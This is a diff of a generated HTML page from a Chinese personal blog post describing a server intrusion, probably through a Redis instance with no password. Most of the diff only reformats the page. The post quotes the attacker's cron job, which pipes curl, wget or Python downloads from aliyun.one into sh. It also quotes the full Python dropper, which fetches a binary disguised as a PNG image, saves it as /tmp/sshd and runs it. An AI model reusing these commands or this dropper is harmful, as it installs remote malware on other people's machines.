@@ -171,9 +171,7 @@
     <i class="fa fa-search"></i>
   </span>
   <div class="search-input-container">
-    <input autocomplete="off" autocorrect="off" autocapitalize="none"
-           placeholder="搜索..." spellcheck="false"
-           type="text" id="search-input">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="搜索..." spellcheck="false" type="text" id="search-input">
   </div>
   <span class="popup-btn-close">
     <i class="fa fa-times-circle"></i>
@@ -195,7 +193,7 @@
   </div>
   <div class="reading-progress-bar"></div>
 
-  <a href="https://github.com/squabbysheep" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+  <a href="https://github.com/squabbysheep" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="external nofollow noopener noreferrer" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
 
 
     <main class="main">
@@ -267,10 +265,15 @@
 
       
         <h4 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">服务器上的服务挂掉了，使用远程登录也登录不上去，只能控制台强制关机</span><br><span class="line">登录之后，发现一个定时任务，如下：</span><br><span class="line">( curl -fsSL -m180 aliyun.one || wget -q -T180 -O- aliyun.one || python -c 'import urllib;exec(urllib.urlopen("http://aliyun.one/pygo").read())' ) | sh &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">看到exec就知道被入侵了(个人没有写exec的习惯)</span><br></pre></td></tr></table></figure>
+
 <h4 id="让我康康"><a href="#让我康康" class="headerlink" title="让我康康"></a>让我康康</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># http://aliyun.one/pygo文件内容如下：</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> platform.architecture()[<span class="number">0</span>] == <span class="string">"64bit"</span>:</span><br><span class="line">    urlx64 = <span class="string">'http://img.sobot.com/chatres/89/msg/20191225/1/ec0991da601e45c4b0bb6178da5f0cc4.png'</span></span><br><span class="line">    urlx642 = <span class="string">'https://user-images.githubusercontent.com/56861392/71443284-08acf200-2745-11ea-8ef3-509d9072d970.png'</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        f = urllib.urlopen(urlx64)</span><br><span class="line">        <span class="keyword">if</span> f.code == <span class="number">200</span>:</span><br><span class="line">            data = f.read()</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">"/tmp/sshd"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> code:</span><br><span class="line">                code.write(data)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            f2 = urllib.urlopen(urlx642)</span><br><span class="line">            data2 = f2.read()</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">"/tmp/sshd"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> code2:</span><br><span class="line">                code2.write(data2)</span><br><span class="line">        os.chmod(<span class="string">"/tmp/sshd"</span>, <span class="number">0o777</span>)</span><br><span class="line">        os.system(<span class="string">"/tmp/sshd"</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    urlx32 = <span class="string">'http://img.sobot.com/chatres/89/msg/20191225/1/50659157a100466a88fed550423a38ee.png'</span></span><br><span class="line">    urlx322 = <span class="string">'https://user-images.githubusercontent.com/56861392/71443285-08acf200-2745-11ea-96c3-0c2be9135085.png'</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        f = urllib.urlopen(urlx32)</span><br><span class="line">        <span class="keyword">if</span> f.code == <span class="number">200</span>:</span><br><span class="line">            data = f.read()</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">"/tmp/sshd"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> code:</span><br><span class="line">                code.write(data)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            f2 = urllib.urlopen(urlx322)</span><br><span class="line">            data2 = f2.read()</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">"/tmp/sshd"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> code2:</span><br><span class="line">                code2.write(data2)</span><br><span class="line">        os.chmod(<span class="string">"/tmp/sshd"</span>, <span class="number">0o777</span>)</span><br><span class="line">        os.system(<span class="string">"/tmp/sshd"</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
 <h4 id="猜测被入侵原因"><a href="#猜测被入侵原因" class="headerlink" title="猜测被入侵原因"></a>猜测被入侵原因</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis没有设置密码，被入侵也正常</span><br><span class="line">-- 以后各种数据库和中间件一定要设置密码</span><br></pre></td></tr></table></figure>
+
 <h4 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.v2ex.com&#x2F;t&#x2F;626230  # 看一下别人的讨论</span><br></pre></td></tr></table></figure>
+
 <h4 id="我的解决办法"><a href="#我的解决办法" class="headerlink" title="我的解决办法"></a>我的解决办法</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">重装系统</span><br><span class="line">- 用来玩的服务器没有任何有价值的资料</span><br></pre></td></tr></table></figure>
+
 
     </div>
 
@@ -361,8 +364,7 @@
 
       <div class="site-overview-wrap sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="Mr.Zhou"
-      src="/images/avatar_bear.png">
+    <img class="site-author-image" itemprop="image" alt="Mr.Zhou" src="/images/avatar_bear.png">
   <p class="site-author-name" itemprop="name">Mr.Zhou</p>
   <div class="site-description" itemprop="description">喜欢的编程语言是Python，喜欢做爬虫与数据相关</div>
 </div>
@@ -415,10 +417,10 @@
   </span>
   <span class="author" itemprop="copyrightHolder">Mr.Zhou</span>
 </div>
-  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v4.2.0
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> 强力驱动 v4.2.0
   </div>
   <span class="post-meta-divider">|</span>
-  <div class="theme-info">主题 – <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.6.0
+  <div class="theme-info">主题 – <a href="https://pisces.theme-next.org/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">NexT.Pisces</a> v7.6.0
   </div>
 
         
